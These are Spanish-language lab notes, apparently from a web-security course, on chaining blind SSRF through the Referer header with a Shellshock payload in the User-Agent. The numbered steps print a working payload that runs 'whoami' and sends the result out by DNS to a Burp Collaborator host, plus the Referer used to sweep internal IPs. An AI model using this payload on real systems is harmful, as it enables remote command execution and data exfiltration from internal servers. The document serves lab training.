En esta clase resolvemos un laboratorio donde el SSRF se combina con la vulnerabilidad Shellshock para ejecutar comandos remotos en un sistema interno. Aprovechamos el hecho de que la aplicación realiza peticiones HTTP a la URL indicada en el header Referer, y que estas peticiones incluyen la cabecera User-Agent, la cual podemos manipular.

Empleamos Burp Collaborator para generar un payload que, al ser ejecutado, filtra el nombre del usuario del sistema mediante una consulta DNS. Este payload es inyectado en el User-Agent usando la sintaxis de Shellshock, y el ataque se lanza desde Burp Intruder variando la IP interna objetivo (192.168.0.X) en el Referer.

Al finalizar, revisamos las interacciones en el Collaborator y recuperamos el nombre del usuario directamente desde el subdominio que llega en la consulta DNS. Esta clase demuestra cómo una SSRF ciega puede convertirse en ejecución remota de comandos en sistemas mal configurados.

-----

1. Estando dentro del producto, en la peticion mandamos una peticion al collaborator de burp y vemos que es posible comunicarnos con el collaborator
2. Ahora, en la misma peticion, nos aprovechamos el user-agent para hacer el shell shock attack, para ello hacemos lo siguiente

    User-Agent: () { :; }; /usr/bin/nslookup $(whoami).collaborator.oastify.com

Esto nos permite hacer una peticion DNS al collaborator pero le añadimos un comando, en este caso "whoami"

3. Entonces podemos hacer un shell shock hacia todos los posible servidores aprovechandonos del "Referer"

    Referer: http://192.168.0.X:8080




